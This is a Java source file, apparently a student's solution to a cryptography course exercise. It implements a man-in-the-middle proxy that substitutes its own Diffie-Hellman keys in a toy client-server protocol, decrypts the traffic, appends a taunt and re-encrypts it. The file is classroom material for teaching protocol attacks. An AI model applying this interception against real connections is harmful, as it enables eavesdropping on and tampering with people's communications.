package crypto.mitm;

import java.io.*;
import java.math.BigInteger;
import java.net.ServerSocket;
import java.net.Socket;

import client.exception.ServerDHKeyException;
import client.utils.StringParser;
import crypto.messages.ServerMessageType;
import crypto.messages.request.*;
import crypto.messages.response.*;
import crypto.students.DHEx;
import crypto.students.StreamCipher;
import org.apache.log4j.Logger;
import org.json.simple.parser.ParseException;

/***
 * This class is an skeleton of a very basic server. It must
 * be extended to offer a Man-in-the-Middle attack.
 * Candidates are prompt to modify it at will. Nevertheless,
 * no external libraries could be used to expand Java capabilities.
 * 
 * @author pabloserrano
 */
public class MitMServer {
	// log for debugging purposes...
	private static Logger log = Logger.getLogger(MitMServer.class);
	
	// class parameters...
	private String ip; // refers to real server
	private int port; // used by MitM and Real server
	private String studentId; // id...
	
	// networking variables
	private ServerSocket serverSocket;
	private Socket socket;
	private DataOutputStream writer;
	private DataInputStream reader;
	private Socket SMsocket;
	private DataOutputStream SMwriter;
	private DataInputStream SMreader;

	// crypto variables
	private BigInteger generator;
	private BigInteger prime;
	private BigInteger pkServer;
	private BigInteger pkClient;
	private BigInteger SMsharedKey;
	private BigInteger MCsharedKey;
	private BigInteger pkToClient;
	private BigInteger skToClient;
	private BigInteger pkToServer;
	private BigInteger skToServer;

	private BigInteger p1;
	private BigInteger p2;
	private StreamCipher SMstreamCipher;
	private StreamCipher MCstreamCipher;
	private long previousCounter = 0L;
	private long[] linesToWork;
	private String modifyContent = "HAHA! YOU HAVE BEEN ATTACKED!";
	
	// message buffer
	private final int BUFFER_SIZE = 8 * 1024; // 8KB is ok...
	
	// class constructor
	public MitMServer(String ip, int port, String studentId) {
		this.ip = ip;
		this.port = port;
		this.studentId = studentId;
	}

	// this method attends just one possible client, other 
	// connections will be discarded (server busy...)
	public void start() throws IOException {
		// Start listening for client's messages
		try {

			int MitMServerPort = 7899;
			serverSocket = new ServerSocket(MitMServerPort);
			socket = serverSocket.accept();
			writer = new DataOutputStream(socket.getOutputStream());
			reader = new DataInputStream(socket.getInputStream());
			SMsocket = new Socket(ip, port);
			SMwriter = new DataOutputStream(SMsocket.getOutputStream());
			SMreader = new DataInputStream(SMsocket.getInputStream());

			// receive the first message
			//contact phases
			contactPhase();

			//exchange key phases
			exchangePhase();

			//specification phases
			specificationPhase();

			//communication phases
			communicationPhase();
			// exist
			exit();
		}catch (IOException ioe) {
			log.error("Connection with the server was not possible");
			ioe.printStackTrace();
		} catch (ParseException pe) {
			log.error("The message received was not parsed correctly");
			pe.printStackTrace();
		} catch (ServerDHKeyException keye) {
			log.error(keye.getMessage());
		} finally {
			// just in case that something goes wrong...
			if (socket != null && !socket.isClosed())
				try {
					socket.close();
				} catch (IOException ex) {
					log.warn("Socket was not closed properly. JDK must do it for you...");
				}
		}
	}

	/***
	 * This method starts the negotiation.
	 * It sends a CLIENT_HELLO message and waits until receives a SERVER_HELLO
	 * message.
	 * Attacker receives the CLIENT_HELLO message from the client and send it to the sever and then
	 * Attacker receives the SERVER_HELLO message from the server and send it to the client
	 * @throws IOException    Communication errors will throw this one
	 * @throws ParseException Appears if something unexpected is received
	 */
	private void contactPhase() throws IOException, ParseException {

		byte[] buffer = new byte[BUFFER_SIZE];
		reader.read(buffer);
		String request = new String(buffer, "UTF-8");
		HelloRequest helloRequest = new HelloRequest();
		helloRequest.fromJSON(StringParser.getUTFString(request));
		SMwriter.write(helloRequest.toJSON().getBytes("UTF-8"));
		SMwriter.flush();
		buffer = new byte[BUFFER_SIZE];
		SMreader.read(buffer);
		writer.write(buffer);
		writer.flush();
	}

	/***
	 *
	 * Attacker would receive the public key of the server and the public key of the client
	 * respectively. Instead of sending them normally, the attacker would create two new
	 * key pairs, one for client and one for server and send public key of these key pairs to
	 * client and server.
	 *
	 * @throws IOException    Communication errors will throw this one
	 * @throws ParseException Appears if something unexpected is received
	 */
	private void exchangePhase() throws IOException, ParseException {
		byte[] buffer = new byte[BUFFER_SIZE];
		reader.read(buffer);
		String request = new String(buffer, "UTF-8");
		DHExStartRequest startRequest = new DHExStartRequest();
		startRequest.fromJSON(StringParser.getUTFString(request));
		SMwriter.write(startRequest.toJSON().getBytes("UTF-8"));
		SMwriter.flush();
		buffer = new byte[BUFFER_SIZE];
		SMreader.read(buffer);
		String reply = new String(buffer, "UTF-8");
		DHExStartResponse response = new DHExStartResponse();
		response.fromJSON(StringParser.getUTFString(reply));
		generator = response.getGenerator();
		prime = response.getPrime();
		pkServer = response.getPkServer();
		long counter = response.getCounter();

		// create the key pair for client
		BigInteger temKey = DHEx.createPrivateKey(2048);
		BigInteger[] pair = DHEx.createDHPair(generator, prime, temKey);
		skToClient = pair[0];
		pkToClient = pair[1];
		// send the attacked key pair to client
		DHExStartResponse attackedResponse = new DHExStartResponse(generator, prime, pkToClient, (int)counter);
		writer.write(attackedResponse.toJSON().getBytes("UTF-8"));
		writer.flush();

		// get the pkClient of the client
		buffer = new byte[BUFFER_SIZE];
		reader.read(buffer);
		request = new String(buffer, "UTF-8");
		DHExRequest dhexRequest = new DHExRequest();
		dhexRequest.fromJSON(StringParser.getUTFString(request));
		pkClient = dhexRequest.getPkClient();
		counter = dhexRequest.getCounter();

		// calculate the MCsharedKey
		MCsharedKey = DHEx.getDHSharedKey(pkClient, skToClient, prime);

		// create the key pair for server
		temKey = DHEx.createPrivateKey(2048);
		pair = DHEx.createDHPair(generator, prime, temKey);
		skToServer = pair[0];
		pkToServer = pair[1];

		// send the pkToServer to server
		dhexRequest = new DHExRequest(pkToServer, (int)counter);
		SMwriter.write(dhexRequest.toJSON().getBytes("UTF-8"));
		SMwriter.flush();

		// calculate the SMSharedKey
		SMsharedKey = DHEx.getDHSharedKey(pkServer, skToServer, prime);

		// print out the SMsharedKey and MCsharedKey
		System.out.println("Key shared by server and attacker:" + SMsharedKey);
		System.out.println("Key shared by client and attacker:" + MCsharedKey);

		// DHExResponse
		buffer = new byte[BUFFER_SIZE];
		SMreader.read(buffer);
		writer.write(buffer);
		writer.flush();

		// finalize the process sending the shared key (for checking only)
		buffer = new byte[BUFFER_SIZE];
		reader.read(buffer);
		request = new String(buffer, "UTF-8");
		DHExDoneRequest doneRequest = new DHExDoneRequest();
		// change the sharedkey type to string in order to parse correctly
		StringBuffer requestBuffer = new StringBuffer(request);
		int beginning = requestBuffer.lastIndexOf(":");
		requestBuffer.insert(beginning + 1, "\"");
		int ending = requestBuffer.lastIndexOf("}");
		requestBuffer.insert(ending, "\"");
		request = requestBuffer.toString();
		doneRequest.fromJSON(StringParser.getUTFString(request));
		counter = dhexRequest.getCounter();
		doneRequest = new DHExDoneRequest(SMsharedKey, (int)counter);
		SMwriter.write(doneRequest.toJSON().getBytes("UTF-8"));
		SMwriter.flush();
	}

	/***
	 * Previously to encrypt messages, attacker would get all
	 * information needed to encrypt and decrypt.
	 *
	 * @throws IOException    Communication errors will throw this one
	 * @throws ParseException Appears if something unexpected is received
	 */
	private void specificationPhase() throws IOException, ServerDHKeyException, ParseException {
		byte[] buff = new byte[BUFFER_SIZE];
		SMreader.read(buff);
		String reply = new String(buff, "UTF-8");
		if (reply.contains("SERVER_DHEX_ERROR")) {
			writer.write(buff);
			writer.flush();
			throw new ServerDHKeyException();
		} else {
			SpecsResponse specsResponse = new SpecsResponse();
			specsResponse.fromJSON(StringParser.getUTFString(reply));
			// get linesToWork, p1, p2 from the specsResponse
			linesToWork = specsResponse.getOutLines();
			p1 = specsResponse.getP1();
			p2 = specsResponse.getP2();
			writer.write(buff);
			writer.flush();
		}
	}

	/***
	 * Attacker would receive text from server or client, encrypt them with
	 * the appropriate key(for text from server, using SMsharedKey, for text from
	 * client, using MCsharedKey), modify them and then encrypt them with the
	 * appropriate key and send them to the correct side
	 *
	 * @throws IOException    Communication errors will throw this one
	 * @throws ParseException Appears if something unexpected is received
	 */
	private void communicationPhase() throws IOException, ParseException {
		// stream cipher is instantiated here!\
		SMstreamCipher = new StreamCipher(SMsharedKey, prime, p1, p2);
		MCstreamCipher = new StreamCipher(MCsharedKey, prime, p1, p2);

		//receive the ACK from the client and send it to the server
		byte[] buff = new byte[BUFFER_SIZE];
		reader.read(buff);
		String request = new String(buff, "UTF-8");
		SpecsDoneRequest doneRequest = new SpecsDoneRequest();
		previousCounter = doneRequest.getCounter();
		doneRequest.fromJSON(StringParser.getUTFString(request));
		SMwriter.write(doneRequest.toJSON().getBytes("UTF-8"));
		SMwriter.flush();

		// Receive all text from Server and send them to the client after modifying
		receiveAllLines();

		// Reset the Shift Register
		SMstreamCipher.reset();
		MCstreamCipher.reset();

		// Receive all text from Client and Send them to Server after modifying
		sendAllLines();

		// Receive the commDoneResponse and commDoneRequest from server and client
		// and send them to the other side
		byte[] buffer = new byte[BUFFER_SIZE];
		SMreader.read(buffer);
		String reply = new String(buffer, "UTF-8");
		CommDoneResponse response = new CommDoneResponse();
		writer.write(response.toJSON().getBytes("UTF-8"));
		writer.flush();
		buff = new byte[BUFFER_SIZE];
		reader.read(buff);
		request = new String(buff, "UTF-8");
		CommDoneRequest CommDoneRequest = new CommDoneRequest();
		CommDoneRequest.fromJSON(StringParser.getUTFString(request));
		SMwriter.write(CommDoneRequest.toJSON().getBytes("UTF-8"));
		SMwriter.flush();
	}

	// Receive all text from Server and send them to the client
	private void receiveAllLines() throws IOException, ParseException {
		// let's do this until no more lines are received from the server!
		while (true) {
			if (receiveLine())
				break;
		}
	}

	// Receive one text from server and after modifying, send it to the client
	private boolean receiveLine() throws IOException, ParseException {
		long messageLength = 0L, lineNumber = 0L;
		// read the message from the server
		byte[] buff = new byte[BUFFER_SIZE];
		SMreader.read(buff);
		String reply = new String(buff, "UTF-8");

		// two possible messages could be received, next length and text done
		if(reply.contains(ServerMessageType.SERVER_TEXT_DONE.toString())) {
			writer.write(buff);
			writer.flush();
			return true;
		}
		else if(reply.contains(ServerMessageType.SERVER_NEXT_LENGTH.toString())) {
			NextLengthResponse response = new NextLengthResponse();
			response.fromJSON(StringParser.getUTFString(reply));
			messageLength = response.getLength();

			// Send the CLIENT_NEXT_LENGTH_RECV() to the server to get the original message
			MessageLengthReceivedRequest msgACKRequest = new MessageLengthReceivedRequest(response.getId(), (int)(++previousCounter));
			SMwriter.write(msgACKRequest.toJSON().getBytes("UTF-8"));
			SMwriter.flush();

			// Get original TEXT Message from the server
			TextResponse textResponse = strictReceive(messageLength);
			// decrypt the content of the message
			String decryptedBody = decrypt(textResponse.getBody(), SMstreamCipher);
			// modify the content
			decryptedBody = decryptedBody + modifyContent;
			String encrpytedMsg = MCstreamCipher.encrypt(decryptedBody);
			textResponse.setBody(encrpytedMsg);

			//send the modified message length to the client
			response.setLength(textResponse.toJSON().length());
			writer.write(response.toJSON().getBytes("UTF-8"));
			writer.flush();

			// Receive Acknowledgement of Message Length from the client
			buff = new byte[BUFFER_SIZE];
			reader.read(buff);

			// send the modified message to the client
			writer.write(textResponse.toJSON().getBytes("UTF-8"));
			writer.flush();

			// Receive the inform from Client and send it to server
			buff = new byte[BUFFER_SIZE];
			reader.read(buff);
			previousCounter++;
			String request = new String(buff, "UTF-8");
			TextReceivedRequest textReceivedRequest = new TextReceivedRequest();
			textReceivedRequest.fromJSON(StringParser.getUTFString(request));
			SMwriter.write(textReceivedRequest.toJSON().getBytes("UTF-8"));
			SMwriter.flush();
		}
		return false;

	}

	private TextResponse strictReceive(long length) throws IOException, ParseException {
		TextResponse response = new TextResponse();

		byte[] buffer = new byte[(int)length];
		SMreader.read(buffer);
		String reply = new String(buffer, "UTF-8");
		response.fromJSON(StringParser.getUTFString(reply));
		return response;
	}

	private TextRequest strictReceiveFromClient(long length) throws IOException, ParseException {
		TextRequest request = new TextRequest();

		byte[] buffer = new byte[(int)length];
		reader.read(buffer);
		String requestContent = new String(buffer, "UTF-8");
		request.fromJSON(StringParser.getUTFString(requestContent));
		return request;
	}

	private String decrypt(String ciphertext, StreamCipher streamCipher) {
		return streamCipher.decrypt(ciphertext);
	}

	// Receive all text from Client and Send them to Server after modifying
	private void sendAllLines() throws IOException, ParseException {
		for (int i = 0; i < linesToWork.length; i++) {
			sendLine();
		}

		byte[] buffer = new byte[BUFFER_SIZE];
		reader.read(buffer);
		String request = new String(buffer, "UTF-8");
		TextDoneRequest textDoneRequest = new TextDoneRequest();
		textDoneRequest.fromJSON(StringParser.getUTFString(request));
		SMwriter.write(textDoneRequest.toJSON().getBytes("UTF-8"));
		SMwriter.flush();
	}

	// Receive one text from Client and Send them to Server after modifying
	private void sendLine() throws IOException, ParseException {
		long messageLength = 0L;

		//receive the message length from the client
		byte[] buffer = new byte[BUFFER_SIZE];
		reader.read(buffer);
		String request = new String(buffer, "UTF-8");
		NextMessageLengthRequest lenRequest = new NextMessageLengthRequest();
		lenRequest.fromJSON(StringParser.getUTFString(request));
		messageLength = lenRequest.getLength();

		// send the MessageLengthReceivedResponse to the client to get the original message
		MessageLengthReceivedRequest messageLengthReceivedRequest = new MessageLengthReceivedRequest(lenRequest.getId(), 5);
		writer.write(messageLengthReceivedRequest.toJSON().getBytes("UTF-8"));
		writer.flush();

		// Receive the real message, modify it and send it to the sever
		TextRequest textRequest = strictReceiveFromClient(messageLength);
		// decrypt the content of the message
		String decryptedBody = decrypt(textRequest.getBody(), MCstreamCipher);
		// modify the content
		decryptedBody = decryptedBody + modifyContent;
		String encrpytedMsg = SMstreamCipher.encrypt(decryptedBody);
		textRequest.setBody(encrpytedMsg);

		// send the modified message length to the server
		lenRequest.setLength(textRequest.toJSON().length());
		SMwriter.write(lenRequest.toJSON().getBytes("UTF-8"));
		SMwriter.flush();

		// Receive the MessageLengthReceivedResponse from the server
		buffer = new byte[BUFFER_SIZE];
		SMreader.read(buffer);

		// Send the modified message to the server
		SMwriter.write(textRequest.toJSON().getBytes("UTF-8"));
		SMwriter.flush();

		// Receive the inform from Server and send it to client
		buffer = new byte[BUFFER_SIZE];
		SMreader.read(buffer);
		writer.write(buffer);
		writer.flush();
	}

	private void exit() throws IOException, ParseException {
		// process the last message...
		byte[] buff = new byte[BUFFER_SIZE];
		SMreader.read(buff);
		String reply = new String(buff, "UTF-8");
		FinishResponse response = new FinishResponse(5);
		writer.write(response.toJSON().getBytes("UTF-8"));
		writer.flush();
		if(socket != null && !socket.isClosed())
			socket.close();
		if(serverSocket !=null && !serverSocket.isClosed())
			serverSocket.close();
	}

}
